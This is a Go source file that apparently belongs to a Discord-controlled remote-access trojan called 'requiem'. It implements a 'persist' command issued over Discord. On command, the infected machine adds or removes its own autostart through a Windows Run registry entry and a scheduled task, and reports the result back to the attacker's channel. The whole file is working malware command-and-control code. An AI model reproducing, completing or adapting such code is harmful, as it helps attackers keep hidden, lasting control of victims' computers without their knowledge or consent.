package commands

import (
	"strings"

	"requiem/persistence"
	"requiem/utils"

	"github.com/bwmarrin/discordgo"
)

func (*PersistCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
	content := strings.Join(args, " ")
	if utils.HasFlag(content, "unpersist") {
		err := persistence.RunRegistryUnpersist()
		if err != nil {
			ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Failed to unpersist (run registry).", msg.Reference())
		}

		err = persistence.SchedularUnpersist()
		if err != nil {
			ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Failed to unpersist (schedular).", msg.Reference())
			return
		}

		ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully unpersisted.", msg.Reference())
		return
	}

	err := persistence.RunRegistryPersist("", true)
	if err != nil {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Failed to persist (run registry).", msg.Reference())
	}

	err = persistence.SchedularPersist("", true)
	if err != nil {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 Failed to persist (schedular).", msg.Reference())
		return
	}

	ses.ChannelMessageSendReply(msg.ChannelID, "🟩 Successfully persisted.", msg.Reference())
}

func (*PersistCommand) Name() string {
	return "persist"
}

func (*PersistCommand) Info() string {
	return "Persists or re-persists this if it was disabled."
}

type PersistCommand struct{}
